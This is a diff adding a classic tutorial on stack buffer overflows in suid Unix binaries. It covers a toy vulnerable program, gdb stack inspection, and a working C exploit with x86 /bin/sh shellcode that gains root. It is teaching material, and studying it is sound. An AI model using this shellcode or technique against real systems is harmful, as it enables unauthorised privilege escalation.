@@ -1,0 +1,382 @@
+An Introduction to executing arbituary code via stack overflows
+---------------------------------------------------------------
+
+Before we delve into the technical details here's a little background.  
+
+Suid/sgid binaries
+------------------
+
+one of the problems with multiuser operating systems is that you will 
+eventually need to allow users to perform functions which require root 
+privledges -- be it changing a password, gecos field information, or 
+accessing restricted devices.  Rather than give the user complete control 
+over the system by giving them root privledges you can make a program 
+that will do what the user wants as root and thus they cannot do anything 
+that my comprimise system security.  You do this with a suid/sgid binary:
+
+-rwsr-xr-x   1 root     root        44705 Jul  1 00:49 /usr/bin/passwd
+
+when the user (whoever he/she may be) executes /usr/bin/passwd the user's 
+uid/gid is changed to root and the binary is executed.  After completing 
+execution the user's uid/gid is changed back to what it was.  
+
+Unfortunately people who write suid/sgid bins have to be very careful to 
+not execute anything that the user may comprimise security with.  One of 
+the things that suid/sgid writers have to be careful of is copying data 
+into buffers without a limit on the number of characters that may be 
+copied.  This is where we come in.  By copying more data than the buffer 
+can contain we can overwrite important parts of the stack and execute 
+arbituary code.
+
+
+Overflow sploits
+----------------
+
+ok.. what is an overflow sploit?  well.. lets have a look at some code:
+
+        void main(int argc, char **argv, char **envp) { 
+        char s[1024];
+          strcpy(s,getenv("TERM"));
+        }
+
+this is a really common peice of code.. and many a sploit is based around 
+just this kind of oversight.  So exactly what is wrong with this and how 
+can we exploit it?  ok.. lets have a look, suppose this file is called 
+"simple".
+
+$ export TERM="01234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+12345678901234567890123456789012345678901234567890123456789012345678901234
+56789012345678901234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+12345678901234567890123456789012345678901234567890123456789012345678901234
+56789012345678901234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+123456789"
+$ ./simple
+Segmentation fault
+
+In case you missed that first bit.. we're setting the variable TERM to 
+over 1024 characters.  We then execute simple and it gives us a 
+segmentation fault.  Why?  Well, to understand that we need to know 
+exactly what is happening.  Do the following:
+
+$ cat simple.c
+#include <simple.h>
+#include <stdlib.h>
+void main(int argc,char **argv,char **envp) {
+char s[1024];
+  strcpy(s,getenv("TERM"));
+}
+$ gcc simple.c -S
+$ cat simple.s
+        .file   "simple.c"
+        .version        "01.01"
+gcc2_compiled.:
+.section        .rodata
+.LC0:
+        .string "TERM"
+.text
+        .align 16
+.globl main
+        .type    main,@function
+main:
+        pushl %ebp
+        movl %esp,%ebp
+        subl $1024,%esp
+        pushl $.LC0
+        call getenv
+        addl $4,%esp
+        movl %eax,%eax
+        pushl %eax
+        leal -1024(%ebp),%eax
+        pushl %eax
+        call strcpy
+        addl $8,%esp
+.L1:
+        movl %ebp,%esp
+        popl %ebp
+        ret
+.Lfe1:
+        .size    main,.Lfe1-main
+        .ident  "GCC: (GNU) 2.7.0"
+$
+
+ok.. so that's a bit and now we need to know something.  We need to know 
+a little x86 asm.. That's a little beyond the scope of this article so 
+you might want to check out a book or two..  Anyways.. here's the 
+important bits of that output:
+
+        pushl %ebp
+        movl %esp,%ebp
+        subl $1024,%esp
+	..
+	ret
+
+The first two lines are called "setting up a stack frame" and is a 
+standard part of code compiled by a c compiler.  The third line here is 
+allocating space on the stack for the "s" variable in our c code back up 
+there.  From this we can get an idea about what the stack looks like:
+
+	+-------------+ -1024(%ebp)
+	|  1024 bytes |                  (s variable)
+	+-------------+     0(%ebp)
+	|     ebp     |
+	+-------------+     4(%ebp)
+	|   ret addr  |
+	+-------------+     8(%ebp)
+	|     argc    |
+	+-------------+    12(%ebp)
+	|     argv    |
+	+-------------+    16(%ebp)
+	|     envp    |
+	+-------------+
+
+ok.. so what happens when we do a strlen of the environment variable TERM 
+that is bigger than 1024 bytes?  We start copying to -1024(%ebp) and go
+to -1023(%ebp) and so on and we SHOULD stop before 0(%ebp) but we dont, 
+we keep going and copy over the value of ebp stored on the stack and the 
+return address.  So what happens when we get to that ret down the 
+bottom?  Well the value of the return address has been overwritten and 
+destroyed so it ends up jumping into the middle of nowhere, that is, 
+unless we make it jump to somewhere useful.
+
+GDB - your new friend
+---------------------
+
+GDB or the GNU symbolic debugger.  Using this useful util we can actually 
+look at what happens.  Our previous example:
+
+$ export TERM="01234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+12345678901234567890123456789012345678901234567890123456789012345678901234
+56789012345678901234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+12345678901234567890123456789012345678901234567890123456789012345678901234
+56789012345678901234567890123456789012345678901234567890123456789012345678
+90123456789012345678901234567890123456789012345678901234567890123456789012
+34567890123456789012345678901234567890123456789012345678901234567890123456
+78901234567890123456789012345678901234567890123456789012345678901234567890
+123456789"
+$ gdb simple
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.14 (i486-slackware-linux),
+Copyright 1995 Free Software Foundation, Inc...(no debugging symbols found)...
+(gdb) break main
+Breakpoint 1 at 0x80004e9
+(gdb) run
+Starting program: simple
+
+Breakpoint 1, 0x80004e9 in main ()
+(gdb) disass
+Dump of assembler code for function main:
+0x80004e0 <main>:       pushl  %ebp
+0x80004e1 <main+1>:     movl   %esp,%ebp
+0x80004e3 <main+3>:     subl   $0x400,%esp
+0x80004e9 <main+9>:     pushl  $0x8000548
+0x80004ee <main+14>:    call   0x80003d8 <getenv>
+0x80004f3 <main+19>:    addl   $0x4,%esp
+0x80004f6 <main+22>:    movl   %eax,%eax
+0x80004f8 <main+24>:    pushl  %eax
+0x80004f9 <main+25>:    leal   0xfffffc00(%ebp),%eax
+0x80004ff <main+31>:    pushl  %eax
+0x8000500 <main+32>:    call   0x80003c8 <strcpy>
+0x8000505 <main+37>:    addl   $0x8,%esp
+0x8000508 <main+40>:    movl   %ebp,%esp
+0x800050a <main+42>:    popl   %ebp
+0x800050b <main+43>:    ret
+0x800050c <main+44>:    nop
+0x800050d <main+45>:    nop
+0x800050e <main+46>:    nop
+0x800050f <main+47>:    nop
+End of assembler dump.
+(gdb) break *0x800050b
+Breakpoint 2 at 0x800050b
+(gdb) cont
+Continuing.
+
+Breakpoint 2, 0x800050b in main ()
+(gdb) stepi
+0x37363534 in __fpu_control ()
+(gdb) stepi
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37363534 in __fpu_control ()
+(gdb)
+
+ok.. so we get a segmentation fault.. why? well cause there's no code at 
+address 0x37363534.  lets have a look at the stack:
+
+$ gdb simple
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.14 (i486-slackware-linux),
+Copyright 1995 Free Software Foundation, Inc...(no debugging symbols found)...
+(gdb) break main
+Breakpoint 1 at 0x80004e9
+(gdb) run
+Starting program: simple
+
+Breakpoint 1, 0x80004e9 in main ()
+(gdb) info registers
+eax            0x0      0
+ecx            0xc      12
+edx            0x0      0
+ebx            0x0      0
+esp            0xbffff800       0xbffff800
+ebp            0xbffffc04       0xbffffc04
+esi            0x50000000       1342177280
+edi            0x50001df0       1342184944
+eip            0x80004ee        0x80004ee
+ps             0x382    898
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x2b     43
+gs             0x2b     43
+(gdb) x/5xw 0xbffffc04
+0xbffffc04 <__fpu_control+3087001064>:  0xbffff8e8      0x08000495      
+0x00000001      0xbffffc18
+0xbffffc14 <__fpu_control+3087001080>:  0xbffffc20
+(gdb) 
+
+the first value here (0xbffff8e8) is the value of ebp before it was 
+pushed onto the stack.  The next value is the return address.  The 
+0x00000001 is argc and 0xbffffc18 is argv and the 0xbffffc20 is envp.  So 
+if we were to copy 1024 + 8 bytes we could overwrite the return address 
+and make it jump back to our code (that we also copy there).  So lets 
+skip to the chase.  If we set TERM to:  
+
+  <lots of nops><some code to execute a shell><a return address>
+
+when we get to the ret it'll return to the nops and continue down to the 
+code which executes a shell.  The only problem we have now is what the 
+return address should be.  The perfect return address would be 0xbffff804 
+but it's rather unlikely that we would have that information when we 
+write the sploit so we try to estimate it.  Here is the sploit for our 
+"simple" example:
+
+
+long get_esp(void)
+{
+__asm__("movl %esp,%eax\n");
+}
+
+char *realegg =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+
+/*char *realegg="\xeb\xfe\0";*/
+
+char s[1034];
+int i;
+char *s1;
+
+#define STACKFRAME (0xc00 - 0x818)
+
+void main(int argc,char **argv,char **envp) {
+  strcpy(s,"TERM=");
+  s1 = s+5;
+  while (s1<s+1028+5-strlen(realegg)) *(s1++)=0x90;
+  while (*realegg) *(s1++)=*(realegg++);
+  *((unsigned long *)s1)=get_esp()+16-1028-STACKFRAME;
+  printf("%08X\n",*((long *)s1));
+  s1+=4;
+  *s1=0;
+  putenv(s);
+  system("bash");
+}
+
+
+The first thing we do is copy TERM= into a string.  We then pad out the s 
+variable with nops and add the egg (the floating peice of code which 
+executes a shell) to the end of the variable and then add the return 
+address.  We then call putenv to set the variable and execute a shell.  
+We execute a shell rather than just calling "simple" so that we can use 
+gdb to debug it.  The "get_esp" routine gets the current value of esp 
+(which may change from machine to machine).  Lets have a look:
+
+$ ./sploit
+BFFFF418
+bash$ ./simple
+bash$
+
+nothing too amazing.. but have a look at this:
+
+$ ls -l simple
+-rwsr-xr-x   1 root     root         4032 Oct  2 18:46 simple*
+$ ./sploit
+BFFFF418
+bash$ ./simple
+bash# 
+
+we have root.  This is why we do overflow sploits.  
+
+The only really tricky part about coding overflow sploits is getting the 
+STACK_FRAME define correct.  To aid us in this we use a little program 
+called whatesp:
+
+long getesp() {
+__asm__("movl %esp,%eax");
+}
+
+void main() {
+        printf("%08X\n",getesp()+4);
+}
+
+when you execute whatesp it prints out the value of esp before the stack 
+frame is setup (before the pushl %ebp, movl %esp,%ebp).  So once you have 
+your sploit ready to rock do:
+
+$ ./sploit
+BFFFF41C
+bash$ ./whatesp
+BFFFF818
+
+the second value you see here BFFFF818 you will notice is the value used 
+in STACK_FRAME up there (0x818).  If you want to gdb and see the sploit 
+going:
+
+$ ./sploit
+BFFFF418
+bash$ gdb whatesp
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.14 (i486-slackware-linux),
+Copyright 1995 Free Software Foundation, Inc...(no debugging symbols found)...
+(gdb) run
+Starting program: whatesp
+BFFFF7FC
+
+Program exited with code 011.
+(gdb)
+
+and replace the 0x818 value in the STACK_FRAME define with 0x7fc.  You 
+can then actually watch the sploit execute.  
+
+That's all yall
+---------------
+
+That concludes the overflow tutorial.  To those of you who saw the first 
+version of this tutorial, I'm sorry the sploit didnt work.  That's what 
+happens when you give it to someone to look over and someone steals it 
+out of their homedir.
+
+QuantumG
